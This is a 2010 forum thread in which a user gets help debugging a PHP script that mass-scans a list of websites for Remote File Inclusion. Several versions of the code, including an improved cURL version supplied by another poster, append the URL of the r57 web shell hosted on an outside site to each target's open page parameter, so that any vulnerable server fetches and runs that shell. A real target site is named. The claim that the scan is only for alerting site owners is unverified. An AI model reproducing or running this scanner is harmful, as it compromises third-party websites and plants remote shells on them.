---
title: "PHP RFI Scanner help needed please"
date: 2010-03-11
forum: Programming Talk
---

### Post by lolzwut on 2010-03-11
Hi, my friend is a security analyst and asked me to create a script for him that would scan a list of possibly vulnerable websites to the RFI attack. This isn't for malicious purposes. The plan is to alert the owners of all the sites found.

That being said, Something is wrong with my code. I know it has something to do with the get_headers part because the file opens fine it's just that one part that I'm having trouble with, it just keeps loading and doesn't stop. Nothing gets echo'd back. Here is my code


[PHP]<?php
set_time_limit(0);

// url used to test attack on the sites
$url = "http://www.xfocus.net/tools/200608/r57.txt";
$open = fopen("sites.txt", 'r');

while(!feof($open)) {

// scan through the sitelist
$s = chop(fgets($open, 256));

$fullurl = "$s$url";

// Check to see if we get a HTTP 200 response and echo back results if so
$headers = get_headers($fullurl);
if (eregi('200', $headers);

echo $fullurl . ' may be vulnerable!';
}

fclose($open);

?>[/PHP]
Thanks!

---

### Post by Xyro on 2010-03-11
What are you expecting this to do?

[PHP]
$headers = get_headers;
[/PHP]

[Here]("http://php.net/manual/en/function.get-headers.php")

---

### Post by lolzwut on 2010-03-11
I know what it does, I figured if I got a HTTP 200 response back instead of a 404 or something then it would verify that it worked. Right?

---

### Post by Xyro on 2010-03-11
> **lolzwut said:**
> I know what it does, I figured if I got a HTTP 200 response back instead of a 404 or something then it would verify that it worked. Right?

[PHP]
array get_headers  ( string $url  [, int $format = 0  ] )
[/PHP]

You are not passing it any arguments.

EDIT: Well now you are, since you've edited it :P

---

### Post by Xyro on 2010-03-11
Also, check the contents of $fullurl. I am not sure what you're appending it to, but to me that doesn't look like it will be a sane URL.

---

### Post by lolzwut on 2010-03-11
Yeah I edited it when I realized I messed up lol. It still doesn't work though.

And I don't understand what's wrong with $fullurl. It's whatever line is currently being scanned with[FONT=monospace] $s = chop(fgets($open, 256));[/FONT][COLOR=#000000][COLOR=#0000BB][/COLOR][COLOR=#007700] 

and adding the .txt shell to it. As far as I know
it would look like [http://blah.com/index.php?page=http://www.xfocus.net/tools/200608/r57.txt](http://blah.com/index.php?page=http://www.xfocus.net/tools/200608/r57.txt)

what am I doing wrong?
[/COLOR][/COLOR]

---

### Post by Xyro on 2010-03-11
[PHP]
$fullurl = "$s$url";
[/PHP]
where $url is 
[PHP]
$url = "http://www.xfocus.net/tools/200608/r57.txt";
[/PHP]

If $s contains another URL (say [http://www.foo.bar](http://www.foo.bar)) then the URL you're feeding into get_headers would be:

```

http://www.foo.barhttp://www.xfocus.net/tools/200608/r57.txt

```

I doubt that is what you want.

---

### Post by lolzwut on 2010-03-11
All the URLs in the list I have end with an uninitialized GET variable. Example:

[http://lifeconnection.dk/index.php?page=](http://lifeconnection.dk/index.php?page=)

is the first url

so it would come out to

[http://lifeconnection.dk/index.php?page=http://www.xfocus.net/tools/200608/r57.txt]("http://lifeconnection.dk/index.php?page=")[COLOR=#000000][COLOR=#dd0000]

[COLOR=Black]which if vulnerable would execute the php code contained in the text file[/COLOR]
[/COLOR][/COLOR]

---

### Post by Xyro on 2010-03-11
Ah, gotchya.

I don't know why that would not work then. Are you checking the web server error logs?

---

### Post by lolzwut on 2010-03-11
No, I'm on my localhost. Do you know where the logs are in xampp?

Anyway I doubt it would generate any errors since it never really loads the entire script.

---

### Post by Xyro on 2010-03-11
> **lolzwut said:**
> No, I'm on my localhost. Do you know where the logs are in xampp?

Anyway I doubt it would generate any errors since it never really loads the entire script.

Sorry, not familiar with xampp.

Try echoing something like the length of the header response, regardless of content. Also, don't test with a full list of URLs, just 2-3 should be good for testing. If you do that, and still nothing gets echo'd, I have no idea.

[This]("http://www.linuxquestions.org/questions/linux-server-73/xampp-log-in-604534/") might help you find your logs.

---

### Post by lolzwut on 2010-03-11
Oh ok, it worked now with 2 urls. So I guess I just have to wait a long time. Thanks for the help :)

EDIT: Nevermind I forgot to edit my code, it still doesn't work. Anyway, thanks for the help. I'll keep looking around :)

---

### Post by Hellkeepa on 2010-03-11
HELLo!

Actually, I'd recommend looking at [cURL](http://no2.php.net/manual/en/book.curl.php), instead of trying to reproduce bits of it yourself. (That is, unless you're doing this for learning purposes.) it has a much cleaner interface, and makes sustained connections a breeze.

*Edit, added:* It also has the added benefit of not being restricted by the "allow_url_fopen" directory in the "php.ini".

Happy codin'!

---

### Post by lolzwut on 2010-03-12
Thanks for the advice. I tried what you said but unfortunately it still isn't working. It does the exact same thing, here's my new code using cURL:


[PHP]<?php
set_time_limit(0);

$url = "http://www.xfocus.net/tools/200608/r57.txt";
$file = "sites.txt";
$fp = fopen($file, 'r');

while(!feof($fp)) {

$s = chop(fgets($fp, 256));

$fullurl = "$s$url";

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $fullurl);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$res = curl_exec($curl);
curl_close($curl);

if (eregi('r57', $res)) {

echo $fullurl . ' may be vulnerable!';

}

}
fclose($fp);
?>[/PHP]

---

### Post by Hellkeepa on 2010-03-12
HELLo!

Try this one, and see if it works better. At the very least it'll help you pinpoint where the error occurs.
[php]<?php

// Make sure script does not time out while testing.
set_time_limit (0);

// URL to test script and source data.
$url = "http://www.xfocus.net/tools/200608/r57.txt";
$file = "sites.txt";
$fp = file ($file);

// Run the test for each entry in the source file.
foreach ($fp as $s) {
	// Generate the complete test URL.
	$fullurl = "$s$url";
var_dump ($fullurl); // Debug code, remove when confirmed working script.

	// Create connection to server, and run test.
	$curl = curl_init ();
	curl_setopt ($curl, CURLOPT_URL, $fullurl);
	curl_setopt ($curl, CURLOPT_RETURNTRANSFER, 1);
	$res = curl_exec ($curl);
	curl_close ($curl);
var_dump ($res); // Debug code, remove when confirmed working script.

	// Check for keyword in returned data.
	if (preg_match ('/[Rr]57/', $res)) {
		echo $fullurl . ' may be vulnerable!';
	}
die (); // Debug code, remove when confirmed working script.
}

?>[/php]
You'll also notice that I've added proper indentation and commenting, to make the code easier to read. This is a very good habit to acquire as soon as possible, as it is easier to acquire a new habit than breaking an old (and bad) one.

Happy codin'!

---

### Post by lolzwut on 2010-03-14
Thanks. 


I looked at your new code and examined the var_dumps but I really have no idea what you're trying to point me to. I don't even really see anything wrong. Can I have a little more information please? Thanks.

---

### Post by Hellkeepa on 2010-03-15
HELLo!

Not without seeing the dumps, as I have no idea what the internal state of the script is without them. What I was trying to point out wasn't where (or why) the script fails, that I do not know, but how to use "var_dump ()" and similar functions to perform basic debugging.

As I'm not even able to open the URL to the test script, I have only the very limited information in this thread to work with. So I don't know more than what you tell me, and error messages/var dumps tell a lot (if you know what to look for).

Happy codin'!

---

### Post by lolzwut on 2010-03-15
Ok sorry. It just loaded up parts of the first site on the list and printed our var_dumps of those variables. Here's a picture for better explaining


[http://i43.tinypic.com/24q6849.jpg](http://i43.tinypic.com/24q6849.jpg)
[ ]("http://i42.tinypic.com/wsqnwo.jpg")

---

### Post by hackedro on 2011-01-05
Sorry that i actualy post in this old thread but you guys have helped this guy to make a RFI scanner . For those who don't know what RFI means ( REMOTE FILE INCLUSION scanner) . 1000+ websites are hacked daily with this method.

---

